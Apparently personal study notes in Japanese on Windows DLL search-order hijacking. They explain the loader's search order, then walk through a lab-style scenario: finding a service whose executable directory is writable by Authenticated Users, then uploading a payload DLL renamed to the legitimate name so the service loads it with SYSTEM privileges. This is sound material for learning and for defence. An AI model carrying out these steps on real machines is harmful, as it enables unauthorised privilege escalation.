ほぼすべてのアプリケーションは外部モジュール（DLL）の関数を参照している。攻撃者が正規のDLLより検索順序の上位にあるディレクトリへ同名の悪意あるDLLを配置することで、そのプログラムのコンテキストで任意コードを実行できる。
## なぜ相対パスで参照されるのか

フルパスによるDLL指定が一般的でない理由：
- `C:\Windows\System32\kernel32.dll` → Windowsが必ずCドライブにあるとは限らない
- `C:\Program Files\MyApp\MyDll.dll` → ユーザーが任意の場所にインストールする可能性がある
そのため開発者は `"kernel32"` や `"MyDll"` のように**名前だけで参照**し、Windowsが検索順序に従って実際のパスを解決する。

## DLL 検索順序
ほとんどのアプリケーションで適用される検索順序：

|優先度|検索場所|
|---|---|
|1|**実行ディレクトリ**（バイナリが存在するフォルダ）|
|2|System32 ディレクトリ|
|3|16bit System ディレクトリ|
|4|Windows ディレクトリ|
|5|プログラムのカレントワーキングディレクトリ|
|6|PATH 環境変数内のディレクトリ|

> アプリケーションの種類によって挙動に若干の差異がある。

## 攻撃シナリオ（具体例）
![[images/Pasted image 20260412192926.png]]

### 状況の確認
サービスのバイナリが `BadDll.dll` を相対パスで `LoadLibrary` しているが、実行ディレクトリには存在しない。
```bash
ls "C:\Program Files\Bad Windows Service\Service Executable"
# → BadWindowsService.exe のみ（BadDll.dll は存在しない）
```

PATH変数を確認すると、`C:\Program Files\Bad Windows Service` が追加されており、実際のDLLはそこに存在していた。
```bash
env
# Path=C:\Windows\system32;...;C:\Program Files\Bad Windows Service;...

ls "C:\Program Files\Bad Windows Service"
# → Service Executable\ (dir)
# → BadDll.dll (10kb)   ← 正規DLLの場所（検索順序: 6番目）
```

### ハイジャック可能な場所の特定
検索順序の **1番目（実行ディレクトリ）** が書き込み可能かどうかを確認する。

```bash
cacls "C:\Program Files\Bad Windows Service\Service Executable"
# → NT AUTHORITY\Authenticated Users: (CI)(OI)F（フルコントロール）✅
```

実行ディレクトリは PATH 内のディレクトリ（6番目）より**優先順位が高い**ため、ここに同名DLLを配置すれば正規DLLより先に読み込まれる。

### 攻撃実行
```bash
cd "C:\Program Files\Bad Windows Service\Service Executable"
upload C:\Payloads\dns_x64.dll
mv dns_x64.dll BadDll.dll    # 正規DLLと同名で配置
```

サービスが次回 `BadDll.dll` をロードする際、実行ディレクトリが最初に検索されるため、悪意あるDLLがSYSTEM権限でロードされる。